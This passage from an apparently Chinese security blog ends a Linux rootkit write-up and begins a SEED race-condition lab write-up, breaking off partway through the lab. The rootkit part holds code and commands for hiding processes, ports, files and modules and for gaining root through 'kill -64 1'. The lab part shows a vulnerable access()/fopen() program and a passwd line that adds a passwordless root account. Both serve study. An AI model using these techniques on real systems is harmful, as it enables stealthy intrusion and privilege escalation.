class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">refcount_t</span> count;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> level;<br><span class="hljs-comment">// lists of tasks that use this pid </span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_head</span> <span class="hljs-title">tasks</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><br><span class="hljs-comment">// wait queue for pidfd notifications </span><br><span class="hljs-keyword">wait_queue_head_t</span> wait_pidfd;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">upid</span> <span class="hljs-title">numbers</span>[1];</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    ......<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pid</span>*<span class="hljs-title">thread_pid</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span><span class="hljs-title">pid_links</span>[<span class="hljs-title">PIDTYPE_MAX</span>];</span><span class="hljs-comment">//找task struct中的对应的pid hlist_node</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">thread_group</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">thread_node</span>;</span><br>    ......<br>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">// #ifdef CONFIG_TASKS_RCU </span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sched_info</span><span class="hljs-title">sched_info</span>;</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span><span class="hljs-title">tasks</span>;</span> list_head 通过list_head将当前进程的task_struct串联进内核的进程列表中<br>    .....<br>    &#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">next</span>, *<span class="hljs-title">prev</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span> **<span class="hljs-title">pprev</span>;</span><br>    <span class="hljs-comment">//需要注意的是pprev是指针的指针,它指向的是前一个节点的next指针；其中首元素的pprev指向链表头的fist字段，末元素的next为NULL. </span><br>&#125;;<br></code></pre></td></tr></table></figure><p>相关的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct task_struct *<span class="hljs-title">pid_task</span><span class="hljs-params">(struct pid *pid, <span class="hljs-keyword">enum</span> pid_type type)</span> <span class="hljs-comment">//用于根据pid和其类型找到对应的task_struct</span></span><br><span class="hljs-function"><span class="hljs-title">find_vpid</span><span class="hljs-params">()</span><span class="hljs-comment">//用于根据nr也就是namespace下的局部pid找到对应的struct pid结构体</span></span><br><span class="hljs-function"><span class="hljs-comment">//使用的链表操作相关的函数</span></span><br><span class="hljs-function"><span class="hljs-title">list_add</span><span class="hljs-params">()</span><span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_del</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_add_head_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_add_tail_rcu</span><span class="hljs-params">()</span>  <span class="hljs-comment">//增加结点</span></span><br><span class="hljs-function"><span class="hljs-title">list_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">hlist_del_rcu</span><span class="hljs-params">()</span><span class="hljs-comment">//删除结点</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_HLIST_NODE</span><span class="hljs-params">()</span><span class="hljs-comment">//初始化链表结点</span></span><br><span class="hljs-function"><span class="hljs-title">INIT_LIST_HEAD</span><span class="hljs-params">()</span><span class="hljs-comment">//初始化链表头</span></span><br><span class="hljs-function"><span class="hljs-title">list_for_each_entry_safe</span><span class="hljs-params">()</span><span class="hljs-comment">//相当于遍历整个双向循环链表,遍历时会存下下一个节点的数据结构,方便对当前项进行删除</span></span><br><span class="hljs-function"><span class="hljs-comment">//内存操作</span></span><br><span class="hljs-function"><span class="hljs-title">kmalloc</span><span class="hljs-params">()</span><span class="hljs-comment">//申请内存存储hide_node结构</span></span><br><span class="hljs-function"><span class="hljs-title">kfree</span><span class="hljs-params">()</span><span class="hljs-comment">//释放hide_node结构占用的内存</span></span><br></code></pre></td></tr></table></figure><p>自定义的数据结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//进程隐藏的存储链表</span><br><span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">hide_list_header</span>=</span>LIST_HEAD_INIT(hide_list_header);<br><span class="hljs-comment">//进程隐藏的存储结点</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hide_node</span>&#123;</span><br><span class="hljs-keyword">pid_t</span> <span class="hljs-keyword">pid_victim_t</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span>* <span class="hljs-title">task_use_t</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">hide_list_header_t</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>使用的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">hide_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//隐藏进程</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_fn</span><span class="hljs-params">(<span class="hljs-keyword">pid_t</span> pid_victim)</span></span>;<span class="hljs-comment">//恢复隐藏的进程</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">recover_pid_all</span><span class="hljs-params">()</span></span>;<span class="hljs-comment">//恢复所有进程</span><br></code></pre></td></tr></table></figure><p>大致的流程：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">hide_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure><ul><li><p>根据pid用find_vpid()找到对应的pid结构体</p></li><li><p>成功找到pid结构体后利用pid_task()找到对应的task struct</p></li><li><p>利用链表操作函数hlist_del_rcu对task struct 结点进行脱链，并用INIT_HLIST_NODE设置task struct 的前后指针</p></li><li><p>然后根据task struct 找到对应的pid 的结点，利用hlist_del_rcu进行脱链，INIT_HLIST_NODE设置其指针为空，并将pprev指向自身。</p></li></ul><p>此时进程已经成功摘除链表被隐藏，但是需要记录对应结构，方便之后恢复</p><ul><li>用kmalloc申请一个hide_node类型结点的空间，设置对应的pid号和task struct指针，并通过list_head将其增加到hide_list_header 链表上进行记录</li></ul><p>到此完成隐藏进程功能，并未后面恢复做准备</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_fn(<span class="hljs-keyword">pid_t</span> pid_victim);<br></code></pre></td></tr></table></figure><ul><li>通过list_for_each_entry_safe来遍历hide_list_header链表，直到找到和pid对应的hide_node的进程。然后利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">recover_pid_all(<span class="hljs-keyword">void</span>);<br></code></pre></td></tr></table></figure><ul><li>这里同样通过list_for_each_entry_safe来遍历hide_list_header链表</li><li>针对其中的每一个隐藏的进程，利用hlist_add_head_rcu将pid链入对应的pid链表，利用list_add_tail_rcu将task链入对应的task struct链表</li></ul><h1 id="端口隐藏"><a href="#端口隐藏" class="headerlink" title="端口隐藏"></a>端口隐藏</h1><blockquote><p>端口隐藏即隐藏已经被使用的端口，在linux中查看已经使用的端口有两个命令，一个是netstat，一个是ss，两个命令调用的系统调用不同，因此实际隐藏的过程也不同</p></blockquote><ul><li>netstat在读取端口信息时会读取以下四个文件（对应的网络协议为tcp、udp、tcp6、udp6）：/proc/net/tcp、/proc/net/udp、/proc/net/tcp6/、/proc/net/udp6</li><li>这几个文件都是序列文件，即seq_file，seq_file定义的结构体如下</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-keyword">char</span> *buf; <span class="hljs-comment">//缓冲区</span><br><span class="hljs-keyword">size_t</span> size;<br><span class="hljs-keyword">size_t</span> from;<br><span class="hljs-keyword">size_t</span> count; <span class="hljs-comment">//缓冲区长度</span><br><span class="hljs-keyword">size_t</span> pad_until;<br><span class="hljs-keyword">loff_t</span> index;<br><span class="hljs-keyword">loff_t</span> read_pos;<br>u64 version;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span>  <span class="hljs-comment">// important</span><br><span class="hljs-keyword">int</span> poll_event;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-keyword">void</span> *<span class="hljs-keyword">private</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p>seq_operations定义的结构体为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-keyword">void</span> * (*start) (struct seq_file *m, <span class="hljs-keyword">loff_t</span> *pos);<br><span class="hljs-keyword">void</span> (*stop) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br><span class="hljs-keyword">void</span> * (*next) (struct seq_file *m, <span class="hljs-keyword">void</span> *v, <span class="hljs-keyword">loff_t</span> *pos);<br><span class="hljs-keyword">int</span> (*show) (struct seq_file *m, <span class="hljs-keyword">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>seq_operations的show函数即为netstat要输出的信息，我们只需要将该函数的 hook掉，在hook之前需要先保存show函数的地址，对应的函数为set_seq_opeartions</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">set_seq_operations</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* open_path,struct seq_operations** operations)</span></span>; <span class="hljs-comment">// open_path是打开的序列文件，operations是要保存的show函数的真实地址</span><br></code></pre></td></tr></table></figure><p>我们在全局变量中声明了一个链表，变量名为hidden_port_list_head，它的作用为存储需要被隐藏的端口的信息，当想隐藏端口时，调用<strong>hide_connect</strong>函数，它的定义为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span><br></code></pre></td></tr></table></figure><p>其中type为网络类型(tcp/udp/tcp6/udp6)，port为端口号，该函数会将需要隐藏的端口添加到链表上。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">node = kmalloc(<span class="hljs-keyword">sizeof</span>(struct port_node), GFP_KERNEL);<br>node-&gt;port = port;<br>node-&gt;type = type;<br><br><span class="hljs-comment">// 向链表中添加节点</span><br>list_add_tail(&amp;node-&gt;<span class="hljs-built_in">list</span>, &amp;hidden_port_list_head);<br></code></pre></td></tr></table></figure><p>当不想隐藏该端口时，使用<strong>hide_unconnect</strong>函数将该节点从链表中删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhide_connect</span><span class="hljs-params">(<span class="hljs-keyword">int</span> type, <span class="hljs-keyword">int</span> port)</span></span>&#123;<br>    list_for_each_entry_safe(entry, next_entry, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>        <span class="hljs-keyword">if</span> (entry-&gt;port == port &amp;&amp; entry-&gt;type == type)&#123;<br>            pr_info(<span class="hljs-string">&quot;Unhiding: %d&quot;</span>, port);<br>            list_del(&amp;entry-&gt;<span class="hljs-built_in">list</span>); <span class="hljs-comment">// 将要隐藏的节点从链表中删除</span><br>            kfree(entry);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>隐藏端口的链表会在我们定义的hook函数中用到</p><p>首先要让定义的hook函数的参数与需要被hook的函数参数相同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fake_seq_show</span><span class="hljs-params">(struct seq_file *seq, <span class="hljs-keyword">void</span> *v)</span></span><br></code></pre></td></tr></table></figure><p>hook函数首先判断网络类型，之后调用原show函数，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (seq-&gt;op == tcp_operations)&#123;<br>    type = TCP_CONNECT;<br>    <span class="hljs-comment">//调用原有的tcp show函数</span><br>    ret = tcp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp_operations)&#123;<br>    type = UDP_CONNECT;<br>    ret = udp_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == tcp6_operations)&#123;<br>    type = TCP6_CONNECT;<br>    ret = tcp6_seq_fun(seq,v);<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (seq-&gt;op == udp6_operations)&#123;<br>    type = UDP6_CONNECT;<br>    ret = udp6_seq_fun(seq,v);<br>&#125;<br></code></pre></td></tr></table></figure><p>show函数会将需要展示的端口信息放在seq-&gt;buf中，而seq-&gt;count记录了buf的缓冲区长度，代码的逻辑为判断新增的缓冲区的字符串是否和想要的隐藏的端口信息相同，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 对hidden_port_list_head遍历</span><br>list_for_each_entry(node, &amp;hidden_port_list_head, <span class="hljs-built_in">list</span>)&#123;<br>    <span class="hljs-keyword">if</span> (type == node-&gt;type)&#123;<br>        <span class="hljs-comment">// seq-&gt;buf为缓冲区,snprintf先按照缓冲区格式声明一个port_str_buf</span><br>        <span class="hljs-built_in">snprintf</span>(port_str_buf, PORT_STR_LEN, <span class="hljs-string">&quot;:%04X&quot;</span>, node-&gt;port);<br>        <span class="hljs-comment">// 之后将缓冲区的新增字符串和port_str_buf进行对比判断是否要过滤端口</span><br>        <span class="hljs-keyword">if</span> (strnstr(seq-&gt;buf + last_len, port_str_buf, this_len))&#123;<br>            pr_info(<span class="hljs-string">&quot;Hiding port: %d&quot;</span>, node-&gt;port);<br>            seq-&gt;count = last_len;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="功能测试"><a href="#功能测试" class="headerlink" title="功能测试"></a>功能测试</h1><p>模块编译、安装、卸载：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">sudo make <br><br>sudo insmod rootkit.ko<br>   <br>sudo rmmod rootkit<br></code></pre></td></tr></table></figure><p>提权：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">id</span><br><br><span class="hljs-attribute">kill</span> -<span class="hljs-number">64</span> <span class="hljs-number">1</span><br><br><span class="hljs-attribute">id</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%8F%90%E6%9D%83.png"></p><p>模块隐藏与恢复</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidemodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showmodule &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E6%A8%A1%E5%9D%97%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>进程隐藏与恢复</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showprocess [PID] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>文件隐藏与恢复</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hidefile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showfile [filename] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://github.com/LaPhilosophie/hello-rootkit/blob/main/image/%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8F&%E6%81%A2%E5%A4%8D.png?raw=true"></p><p>端口隐藏与恢复</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade">echo hideport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br>echo showport [port] &gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/%E7%AB%AF%E5%8F%A3%E9%9A%90%E8%97%8F%26%E6%81%A2%E5%A4%8D.png"></p><p>参考资料</p><ul><li><a href="http://www.ouah.org/LKM_HACKING.html">(nearly) Complete Linux Loadable Kernel Modules</a></li><li><a href="https://github.com/milabs/awesome-linux-rootkits">awesome-linux-rootkits</a></li><li><a href="https://arttnba3.cn/2021/07/07/CODE-0X01-rootkit/">简易 Linux rootkit 编写入门指北</a></li><li><a href="https://github.com/f0rb1dd3n/Reptile">Reptile</a></li><li><a href="https://github.com/ivyl/rootkit">Sample rootkit for Linux</a></li><li><a href="https://paper.seebug.org/1871/">【rootkit 系列研究】rootkit 检测技术发展现状</a></li><li><a href="https://github.com/plusls/rootkit">https://github.com/plusls/rootkit</a></li><li><a href="https://github.com/TangentHuang/ucas-rootkit">https://github.com/TangentHuang/ucas-rootkit</a></li><li><a href="https://xcellerator.github.io/posts/linux_rootkits_07/">https://xcellerator.github.io/posts/linux_rootkits_07/</a></li><li><a href="https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs">https://github.com/torvalds/linux/tree/325d0eab4f31c6240b59d5b2b8042c88f59405b5/fs</a></li><li><a href="https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html">https://docs-conquer-the-universe.readthedocs.io/zh_CN/latest/linux_rootkit/fundamentals.html</a></li><li><a href="https://github.com/vkobel/linux-syscall-hook-rootkit">https://github.com/vkobel/linux-syscall-hook-rootkit</a></li><li><a href="https://linux.die.net/man/2/getdents64">https://linux.die.net/man/2/getdents64</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>SEED-lab：Race Condition Vulnerability Lab</title>
    <link href="/p/529b2f3d/"/>
    <url>/p/529b2f3d/</url>
    
    <content type="html"><![CDATA[<h1 id="lab-setup"><a href="#lab-setup" class="headerlink" title="lab setup"></a>lab setup</h1><p>/tmp目录具有Sticky Bit（SBIT），可以看到权限是drwxrwxrwt，这意味着任何人都可以在 /tmp内新增、修改文件，但仅有该文件/目录建立者与 root 能够删除自己的目录或文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">drwxrwxrwt</span>  <span class="hljs-number">24</span> root root <span class="hljs-number">4</span>.<span class="hljs-number">0</span>K Nov  <span class="hljs-number">1</span> <span class="hljs-number">20</span>:<span class="hljs-number">09</span> tmp/<br></code></pre></td></tr></table></figure><p>Linux的保护机制：</p><ul><li>“symlinks in world-writable sticky directories (e.g./tmp) cannot be followed if the follower and directory owner do not match the symlink owner.”</li><li>prevents the root from writing to the files in /tmp that are owned by others. In this lab, we need to disable these protections.</li></ul><p>具体可以参见：<a href="https://wiki.ubuntu.com/Security/Features#Symlink_restrictions">https://wiki.ubuntu.com/Security/Features#Symlink_restrictions</a></p><p>Stack Overflow上也有类似的问题：<a href="https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp">https://unix.stackexchange.com/questions/355033/permissions-of-symlinks-inside-tmp</a></p><p>为了实验的正常进行，关闭保护机制：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo sysctl -w fs.protected_symlinks=0</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sysctl fs.protected_regular=0</span><br></code></pre></td></tr></table></figure><p>一个容易受到攻击的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* fn = <span class="hljs-string">&quot;/tmp/XYZ&quot;</span>;<br>    <span class="hljs-keyword">char</span> buffer[<span class="hljs-number">60</span>];<br>    FILE* fp;<br><br>    <span class="hljs-comment">/* get user input */</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%50s&quot;</span>, buffer);<br><br>    <span class="hljs-keyword">if</span> (!access(fn, W_OK)) &#123;<br>        fp = fopen(fn, <span class="hljs-string">&quot;a+&quot;</span>);<br>        <span class="hljs-keyword">if</span> (!fp) &#123;<br>            perror(<span class="hljs-string">&quot;Open failed&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>        &#125;<br>        fwrite(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-number">1</span>, fp);<br>        fwrite(buffer, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>), <span class="hljs-built_in">strlen</span>(buffer), fp);<br>        fclose(fp);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No permission \n&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>access() system call checks if the Real User ID has write access to /tm/X.After the check, the file is opened for writing</li><li>open() checks the effective user id which is 0 and hence file will be opened</li><li>root用户可以在任意文件执行写操作</li></ul><p><img src="/image/racecondition.png"></p><h1 id="Task-1-Choosing-Our-Target"><a href="#Task-1-Choosing-Our-Target" class="headerlink" title="Task 1: Choosing Our Target"></a>Task 1: Choosing Our Target</h1><p>在<code>/etc/passwd</code>文件中，每个用户都有一个条目（行），用冒号(:)分隔的七个字段组成。下面是一个栗子：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">root:x:0:0:root:/root:/bin/bash<br></code></pre></td></tr></table></figure><p>从左到右分别是：</p><ul><li>用户名</li><li>密码</li><li>User ID </li><li>Group ID</li><li>注释</li><li>home directory</li><li>用户登录后执行的命令</li></ul><p>密码字段是x，表示密码存储在影子文件/etc/shadow中，需要在影子文件中查找。如果用真实密码替换掉x，那么就会直接使用这个密码（hash值），而不是在影子文件中查找</p><p>Ubuntu中有一个无密码账户的魔法值<code>U6aMy0wojraho </code>，如果我们将此值放在用户条目的密码字段中，那么只需在提示输入密码时按一下回车键即可</p><p>向<code>/etc/passwd</code>文件添加如下记录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">test:U6aMy0wojraho:0:0:test:/root:/bin/bash<br></code></pre></td></tr></table></figure><p>可以创建一个具有 root 